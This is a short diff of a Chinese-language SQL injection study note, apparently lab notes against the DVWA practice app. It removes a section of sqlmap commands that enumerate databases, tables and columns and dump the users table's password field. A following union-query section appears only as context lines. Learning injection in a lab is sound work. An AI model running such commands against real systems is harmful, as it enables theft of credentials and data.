@@ -3,28 +3,6 @@ title: 04-Sql注入
 sort: 
 --> 
 
-## Sqlmap
-
-> 查询数据库
->
-> `sqlmap -r xxx -p pwd --dbs`
->
-> 使用url
->
-> `sqlmap -u http://xxx -p pwd --dbs`
->
-> 指定数据库下的数据表
->
-> `sqlmap -r xxx -p id -D dvwa --tables`
->
-> 表中的全部列
->
-> `sqlmap -r xxx -p id -D dvwa -T users --columns`
->
-> 表中的具体字段
->
-> `sqlmap -r xxx -p id -D dvwa -T users -C user_id,avatar,password --dump`
-
 ## 联合查询
 
 1. 判断列数
